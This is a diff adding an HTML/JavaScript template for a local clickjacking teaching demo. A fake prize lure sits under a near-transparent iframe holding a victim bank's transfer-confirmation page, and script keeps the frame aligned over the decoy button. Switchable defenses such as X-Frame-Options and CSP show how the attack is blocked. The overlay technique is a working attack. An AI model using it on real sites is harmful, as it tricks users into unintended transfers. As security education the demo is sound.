@@ -1,0 +1,407 @@
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>分屏演示 · 透明 iframe 点击劫持</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/attacker.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/demo.css') }}">
+  </head>
+  <body class="attacker-shell demo-shell">
+    <header class="attacker-header">
+      <a class="brand" href="{{ url_for('demo.index') }}">
+        <span class="brand-mark">DE</span>
+        <span>分屏演示 · 透明 iframe 点击劫持</span>
+      </a>
+      <nav aria-label="演示控制">
+        <label class="defense-picker">
+          防御：
+          <select id="defense-select" aria-label="选择防御配置">
+            <option value="none">无防御</option>
+            <option value="xfo-deny">XFO DENY</option>
+            <option value="xfo-sameorigin">XFO SAMEORIGIN</option>
+            <option value="csp-none">CSP none</option>
+            <option value="csp-partner-allowlist">CSP 合作方白名单</option>
+            <option value="confirm-reconfirm">两阶段确认</option>
+            <option value="business-hardened">业务纵深防御</option>
+            <option value="frame-busting-hidden">隐藏式 frame-busting</option>
+          </select>
+        </label>
+        <button type="button" class="attacker-button" id="xray-toggle">透视：关</button>
+        <a class="attacker-button" id="login-link"
+           href="{{ victim_login_url }}?next={{ demo_return_url | urlencode }}">本页登录 victim（alice）</a>
+        <button type="button" class="attacker-button" id="reset-button">重置演示数据</button>
+      </nav>
+    </header>
+
+    <main class="attacker-main">
+      <ol class="demo-steps" aria-label="演示步骤">
+        <li id="step-1">① 用本浏览器登录过 victim（alice）</li>
+        <li id="step-2">② 在左侧点击“领取”按钮</li>
+        <li id="step-3">③ 看右侧账户变化与解说</li>
+      </ol>
+
+      <div id="attack-banner" class="demo-banner" hidden></div>
+
+      <div class="demo-grid">
+        <section class="demo-left">
+          <p class="demo-pane-label">① 攻击者页面 · 受害者看到的</p>
+          <div class="attack-stage" id="stage">
+            <div class="decoy-card">
+              <span class="decoy-badge">🎁 限时抽奖活动</span>
+              <h2>恭喜！您已抽中今日专属大奖</h2>
+              <div class="decoy-prize">📱</div>
+              <p class="decoy-countdown">⏱ 距奖品过期 09:47</p>
+              <p>点击下方按钮立即领取，奖品数量有限，10 分钟内有效。</p>
+              <button type="button" class="decoy-button" id="decoy-button">{{ params.decoy_text }}</button>
+            </div>
+            <iframe id="victim-frame"
+                    title="attack target"
+                    src="{{ params.victim_url() }}"
+                    style="width: {{ params.iframe_width }}px; height: {{ params.iframe_height }}px; opacity: 0.01;"></iframe>
+          </div>
+          <p class="demo-hint">
+            蓝色按钮上方覆盖着一个<b>完全透明的 iframe</b>，里面是 victim 的转账确认页。
+            点“{{ params.decoy_text }}”实际按下的是“确认转账”。
+          </p>
+        </section>
+
+        <section class="demo-right">
+          <p class="demo-pane-label">② 受害者账户实况 · victim 服务器视角</p>
+          <div class="account-card">
+            <p class="account-name">alice · 储蓄账户</p>
+            <p class="account-balance" id="balance">--</p>
+            <p class="account-sub" id="transfer-count">交易记录加载中…</p>
+          </div>
+          <div class="transfer-panel">
+            <h3>最近交易</h3>
+            <ul class="transfer-list" id="transfer-list"></ul>
+          </div>
+          <div class="narration-panel">
+            <h3>事件解说</h3>
+            <ul class="narration" id="narration">
+              <li class="narration-item info">等待演示…</li>
+            </ul>
+          </div>
+        </section>
+      </div>
+    </main>
+
+    <footer class="attacker-footer">
+      <span>右侧数据来自 victim 测试 API（与 M7 动态审计同一证据源），每秒刷新</span>
+      <span>仅限本地授权实验</span>
+    </footer>
+
+    <script>
+      (function () {
+        "use strict";
+        const VICTIM_ORIGIN = {{ params.victim_base | tojson }};
+        const STATE_URL = {{ url_for('demo.victim_state', origin=params.victim_base, username='alice') | tojson }};
+        const RESET_URL = {{ url_for('demo.victim_reset', origin=params.victim_base) | tojson }};
+        const ATTACK_AMOUNT = {{ params.victim_query.amount_cents | tojson }};
+
+        const frame = document.getElementById("victim-frame");
+        const stage = document.getElementById("stage");
+        const decoy = document.getElementById("decoy-button");
+        const balanceEl = document.getElementById("balance");
+        const countEl = document.getElementById("transfer-count");
+        const listEl = document.getElementById("transfer-list");
+        const narrationEl = document.getElementById("narration");
+        const bannerEl = document.getElementById("attack-banner");
+        const xrayButton = document.getElementById("xray-toggle");
+        const resetButton = document.getElementById("reset-button");
+
+        let loads = 0;
+        let firstClickAt = 0;
+        let attackConfirmed = false;
+        let fastPollsLeft = 0;
+        let lastState = null;
+        let pollTimer = null;
+        // 透视是演示时的讲解开关，登录往返后应当保持原样，否则每次都要重开。
+        const storedXray = sessionStorage.getItem("demo_xray");
+        let xray = storedXray === null ? {{ 'true' if params.debug else 'false' }} : storedXray === "1";
+
+        function clock() {
+          return new Date().toLocaleTimeString("zh-CN", { hour12: false });
+        }
+
+        function narrate(text, kind) {
+          if (narrationEl.firstElementChild && narrationEl.children.length === 1 &&
+              narrationEl.firstElementChild.textContent === "等待演示…") {
+            narrationEl.innerHTML = "";
+          }
+          const item = document.createElement("li");
+          item.className = "narration-item " + (kind || "info");
+          item.innerHTML = '<span class="n-time">' + clock() + "</span><span>" + text + "</span>";
+          narrationEl.prepend(item);
+        }
+
+        function yuan(cents) {
+          return "¥" + (cents / 100).toFixed(2);
+        }
+
+        function renderState(state) {
+          balanceEl.textContent = yuan(state.account.balance_cents);
+          countEl.textContent = state.transfers.length + " 笔交易 · " + state.grants.length + " 项授权";
+          listEl.innerHTML = "";
+          state.transfers.slice(-6).reverse().forEach(function (item) {
+            const li = document.createElement("li");
+            li.innerHTML =
+              '<span class="t-amount out">' + yuan(item.amount_cents) + "</span>" +
+              '<span class="t-to">→ ' + item.recipient + "</span>" +
+              '<span class="t-note">' + (item.note || "快捷转账实验") + "</span>";
+            listEl.appendChild(li);
+          });
+          if (!state.transfers.length) {
+            listEl.innerHTML = '<li class="t-empty">暂无交易</li>';
+          }
+        }
+
+        function diffState(previous, current) {
+          const notes = [];
+          const prevIds = new Set(previous.transfers.map(function (t) { return t.id; }));
+          current.transfers.forEach(function (t) {
+            if (!prevIds.has(t.id)) {
+              notes.push("新增转账 " + yuan(t.amount_cents) + " → " + t.recipient + "（你没有在 victim 页面操作过它）");
+            }
+          });
+          const prevGrantIds = new Set(previous.grants.map(function (g) { return g.id; }));
+          current.grants.forEach(function (g) {
+            if (!prevGrantIds.has(g.id)) {
+              notes.push("新增第三方授权：" + g.client_name);
+            }
+          });
+          if (previous.account.balance_cents !== current.account.balance_cents) {
+            notes.push("余额 " + yuan(previous.account.balance_cents) + " → " + yuan(current.account.balance_cents));
+          }
+          return notes;
+        }
+
+        async function pollState() {
+          try {
+            const response = await fetch(STATE_URL);
+            if (!response.ok) throw new Error("state " + response.status);
+            const state = await response.json();
+            renderState(state);
+            if (lastState !== null) {
+              const notes = diffState(lastState, state);
+              if (notes.length && !attackConfirmed) {
+                attackConfirmed = true;
+                notes.forEach(function (note) { narrate(note, "success"); });
+                bannerEl.hidden = false;
+                bannerEl.className = "demo-banner success";
+                bannerEl.textContent = "攻击成功：受害者的点击被劫持，victim 业务状态已改变（金额 " +
+                  yuan(ATTACK_AMOUNT) + " 预设于攻击页参数）";
+                document.getElementById("step-3").classList.add("done");
+              }
+            }
+            lastState = state;
+          } catch (error) {
+            countEl.textContent = "无法连接 victim（" + VICTIM_ORIGIN + "），请确认 victim 已启动";
+          }
+        }
+
+        function schedulePolling() {
+          if (pollTimer) clearInterval(pollTimer);
+          const interval = fastPollsLeft > 0 ? 400 : 1200;
+          if (fastPollsLeft > 0) fastPollsLeft -= 1;
+          pollTimer = setInterval(function () {
+            schedulePolling();
+            pollState();
+          }, interval);
+        }
+
+        function alignFrame() {
+          const stageRect = stage.getBoundingClientRect();
+          const decoyRect = decoy.getBoundingClientRect();
+          const cx = decoyRect.left + decoyRect.width / 2 - stageRect.left;
+          const cy = decoyRect.top + decoyRect.height / 2 - stageRect.top;
+          frame.style.left = Math.round(cx - {{ params.iframe_width }} / 2) + "px";
+          frame.style.top = Math.round(cy - {{ params.iframe_height }} / 2) + "px";
+        }
+
+        frame.addEventListener("load", function () {
+          loads += 1;
+          if (defenseBlocked) {
+            // A blocked frame still fires load: the document inside is the
+            // browser's error page, not the victim page. Say so, or the demo
+            // claims "loaded" while the audience sees an empty box.
+            if (!defenseNarrated) {
+              defenseNarrated = true;
+              narrate(
+                "目标页被浏览器拦截（" + defenseReason + "），iframe 内是拦截页；点击不会到达目标。",
+                "warn"
+              );
+            }
+            document.getElementById("step-1").classList.remove("done");
+            return;
+          }
+          if (loads === 1) {
+            narrate("victim 转账确认页已在透明 iframe 中加载（受害者看不见它）");
+            document.getElementById("step-1").classList.add("done");
+          } else if (loads === 2) {
+            // 就绪后恰好一次跳转才是提交；更高计数多为程序性重载
+            narrate("iframe 内发生页面跳转 = 表单已被提交（“确认转账”被按下）", "warn");
+            document.getElementById("step-2").classList.add("done");
+          }
+        });
+
+        document.addEventListener("pointerdown", function (event) {
+          if (event.target === frame) {
+            firstClickAt = Date.now();
+            fastPollsLeft = 15;
+            narrate("受害者点击了“{{ params.decoy_text }}” —— 点击落入透明 iframe", "click");
+            setTimeout(function () {
+              if (!attackConfirmed && loads < 2) {
+                narrate("点击未生效：当前浏览器可能没有登录 victim。点右上角“打开 victim 登录页”，登录 alice 后回来再试。", "warn");
+              }
+            }, 8000);
+          }
+        });
+
+        function applyXray() {
+          frame.style.opacity = xray ? "0.35" : "0.01";
+          frame.classList.toggle("debug-outline", xray);
+          xrayButton.textContent = "透视：" + (xray ? "开" : "关");
+        }
+
+        xrayButton.addEventListener("click", function () {
+          xray = !xray;
+          sessionStorage.setItem("demo_xray", xray ? "1" : "0");
+          applyXray();
+          if (xray) narrate("透视开启：红色边框内就是被覆盖的 victim 确认页", "info");
+        });
+        applyXray();
+
+        // ---- 防御热切换（无需终端） ----
+        const defenseSelect = document.getElementById("defense-select");
+        const DEFENSE_URL = {{ url_for('demo.victim_defense', origin=params.victim_base) | tojson }};
+        const DEFENSE_VERDICT_URL =
+          DEFENSE_URL + "&ancestor=" + encodeURIComponent(window.location.origin);
+        let defenseBlocked = false;
+        let defenseReason = "";
+        let defenseNarrated = false;
+
+        function showDefenseBanner() {
+          if (!defenseBlocked) {
+            bannerEl.hidden = true;
+            return;
+          }
+          bannerEl.hidden = false;
+          bannerEl.className = "demo-banner warn";
+          bannerEl.textContent =
+            "当前防御「" + defenseSelect.value + "」已阻止嵌入（" + defenseReason +
+            "）：iframe 里是浏览器的拦截页，点击不会到达目标，右侧台账不会变化。";
+        }
+
+        async function refreshDefenseVerdict() {
+          try {
+            const response = await fetch(DEFENSE_VERDICT_URL);
+            const payload = await response.json();
+            defenseBlocked = payload.blocks_framing === true;
+            defenseReason = payload.block_reason || "框架控制";
+          } catch (error) {
+            defenseBlocked = false;
+            defenseReason = "";
+          }
+          showDefenseBanner();
+          // The iframe may already have fired its load before this verdict
+          // arrived, so narrate the blocked state here instead of only in the
+          // load handler.
+          if (defenseBlocked && !defenseNarrated) {
+            defenseNarrated = true;
+            narrate(
+              "目标页被浏览器拦截（" + defenseReason + "），iframe 内是拦截页；点击不会到达目标。",
+              "warn"
+            );
+          }
+          if (!defenseBlocked) {
+            defenseNarrated = false;
+          }
+        }
+
+        async function reloadFrame() {
+          loads = 0; // 重置计数：重载后的首次 load 是"页面就绪"，不是提交
+          frame.src = frame.src.split("#")[0] +
+            (frame.src.includes("?") ? "&" : "?") + "_d=" + Date.now();
+        }
+
+        defenseSelect.addEventListener("change", async function () {
+          const target = defenseSelect.value;
+          try {
+            const response = await fetch(DEFENSE_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ profile: target })
+            });
+            const payload = await response.json();
+            if (payload.status === "ok") {
+              await refreshDefenseVerdict();
+              narrate(
+                defenseBlocked
+                  ? "防御已切换为「" + payload.profile + "」：该档会阻止嵌入，点击不会到达目标"
+                  : "防御已切换为「" + payload.profile + "」，iframe 正在按新策略重新加载",
+                "warn"
+              );
+              await reloadFrame();
+            } else {
+              narrate("防御切换失败：" + (payload.detail || payload.error || "未知错误"), "warn");
+            }
+          } catch (error) {
+            narrate("防御切换请求失败（victim 是否在运行？）", "warn");
+          }
+        });
+
+        (async function loadCurrentDefense() {
+          try {
+            const response = await fetch(DEFENSE_URL);
+            const payload = await response.json();
+            if (payload.profile && defenseSelect.querySelector('option[value="' + payload.profile + '"]')) {
+              defenseSelect.value = payload.profile;
+            }
+          } catch (error) { /* 下拉框保持默认即可 */ }
+          await refreshDefenseVerdict();
+        })();
+
+        // 从登录页（或其他标签页）切回来时自动重载目标页：
+        // 登录后 iframe 里仍是旧会话加载的登录页，直接点击会因旧 CSRF
+        // 令牌失效而出现 400 Bad Request，重载即可拿到最新登录态。
+        let lastFocusReload = 0;
+        window.addEventListener("focus", function () {
+          const now = Date.now();
+          if (now - lastFocusReload < 2000) { return; }
+          lastFocusReload = now;
+          reloadFrame();
+          narrate("检测到返回本页：目标页已按当前登录状态重新加载", "info");
+        });
+
+        resetButton.addEventListener("click", async function () {
+          await fetch(RESET_URL, { method: "POST" });
+          attackConfirmed = false;
+          lastState = null;
+          bannerEl.hidden = true;
+          narrationEl.innerHTML = '<li class="narration-item info">已重置 victim 数据，可重新演示</li>';
+          await pollState();
+        });
+
+        window.addEventListener("DOMContentLoaded", function () {
+          alignFrame();
+          pollState();
+          schedulePolling();
+        });
+        // 布局在初次对齐后仍会变化（字体/emoji 渲染、右侧面板数据加载、
+        // 滚动条出现都会挪动按钮位置），因此把重对齐挂到每一个布局变化点，
+        // 避免出现"进入页面时 iframe 未盖住按钮、滚动一下才对上"的情况。
+        window.addEventListener("load", alignFrame);
+        window.addEventListener("resize", alignFrame);
+        window.addEventListener("scroll", alignFrame, { passive: true });
+        if (document.fonts && document.fonts.ready) {
+          document.fonts.ready.then(function () { alignFrame(); });
+        }
+        [300, 800, 1500].forEach(function (ms) {
+          setTimeout(alignFrame, ms);
+        });
+      })();
+    </script>
+  </body>
+</html>
